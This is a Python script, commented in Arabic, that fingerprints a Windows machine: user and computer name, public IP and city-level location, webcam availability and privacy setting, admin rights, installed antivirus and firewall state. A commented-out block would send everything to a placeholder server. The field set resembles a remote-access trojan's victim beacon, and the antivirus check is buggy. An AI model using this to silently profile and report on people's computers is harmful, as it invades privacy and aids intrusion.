#!/usr/bin/env python
import subprocess
import os
import uuid
import requests
import platform
import cv2
import logging
import sys
import ctypes
import psutil

# --- إعداد الـ Logging العام ---
log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler = logging.FileHandler('app_client_debug.log', encoding='utf-8')
file_handler.setFormatter(log_formatter)
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(log_formatter)

logging.basicConfig(level=logging.INFO, handlers=[file_handler, console_handler])

def global_handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    logging.critical("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))

sys.excepthook = global_handle_exception
logger = logging.getLogger(__name__)

# --- الدوال الوظيفية (معالجة الأخطاء وإرجاع قيم افتراضية بدلاً من تعليق السكريبت) ---

def get_device_uuid():
    try:
        device_uuid = uuid.UUID(int=uuid.getnode())
        return str(device_uuid)[-10:]
    except Exception:
        return "unknown_id"

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip', '0.0.0.0')
    except Exception as e:
        logging.error("Failed to get public IP", exc_info=True) 
        return "0.0.0.0"

def get_location():
    try:
        response = requests.get('https://ipinfo.io/json', timeout=5)
        data = response.json()
        return data.get('country'), data.get('region'), data.get('city')
    except Exception as e:
        logging.error("Failed to get location", exc_info=True) 
        return None, None, None

def check_camera():
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if cap.isOpened():
        cap.release()
        return True
    return False

def check_camera_privacy():
    try:
        cmd = 'powershell.exe -Command "(Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\').Value"'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=5)
        status = result.stdout.strip()
        return status if status in ["Allow", "Deny"] else "Unknown"
    except Exception:
        return "Unknown"

def get_antivirus_info():
    try:
        command = 'powershell.exe -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"'
        result = subprocess.run(command, capture_output=True, text=True, shell=True, timeout=5)
        lines = [line.strip() for line in result.splitlines() if line.strip()]
        return ", ".join(lines) if lines else "Windows Defender / None"
    except Exception:
        return "Unknown"

def is_admin():
    return "Admin" if ctypes.windll.shell32.IsUserAnAdmin() != 0 else "User"

def is_firewall_enabled():
    try:
        result = subprocess.run(["netsh", "advfirewall", "show", "currentprofile"], capture_output=True, text=True, timeout=5)
        return "ON" in result.stdout
    except Exception:
        return False

def get_os_edition():
    try:
        result = subprocess.run(["powershell", "-Command", "(Get-WmiObject -Class Win32_OperatingSystem).Caption"], capture_output=True, text=True, timeout=5)
        os_edition = result.stdout.strip()
        return os_edition.replace("Microsoft ", "") if os_edition.startswith("Microsoft") else os_edition
    except Exception:
        return platform.system()

# --- تجميع البيانات (Data Aggregation) ---
def collect_all_system_data():
    country_code, region, city = get_location()
    ram = psutil.virtual_memory()
    
    # هذا القاموس يحتوي على كل المخرجات بشكل منظم جداً ليطابق حقول قاعدة البيانات
    system_data = {
        "client_id": f"Client_{get_device_uuid()}",
        "device_user": f"{os.environ.get('COMPUTERNAME', 'Unknown')}/{os.environ.get('USERNAME', 'Unknown')}",
        "public_ip": get_public_ip(),
        "country": country_code if country_code else "Unknown",
        "region": region if region else "Unknown",
        "city": city if city else "Unknown",
        "os_version": f"{get_os_edition()} {platform.architecture()[0]}",
        "camera_enabled": check_camera(),
        "camera_privacy": check_camera_privacy(),
        "user_privilege": is_admin(),
        "cpu_cores": psutil.cpu_count(logical=True),
        "cpu_usage_percent": psutil.cpu_percent(interval=0.5),
        "ram_total_gb": int(ram.total / (1024**3)),
        "ram_usage_percent": ram.percent,
        "antivirus": get_antivirus_info(),
        "firewall_enabled": is_firewall_enabled()
    }
    
    return system_data

if __name__ == "__main__":
    logger.info("Starting system data collection...")
    data = collect_all_system_data()
    logger.info(f"Collected Data: {data}")
    
    # هنا يتم الربط مع السكريبت المسؤول عن قاعدة البيانات:
    # خيار أ: إذا كنت تستدعي هذا السكريبت كـ Module في السكريبت الرئيسي:
    # فقط قم بعمل return data داخل دالة.
    
    # خيار ب: إذا كنت ترسل البيانات عبر API إلى السيرفر (الذي يحفظها في الباكيند):
    # try:
    #     response = requests.post("https://your-backend-server.com/api/agent/sync", json=data, timeout=10)
    #     logger.info(f"Sync status: {response.status_code}")
    # except Exception as e:
    #     logger.error(f"Failed to sync with database API: {e}")
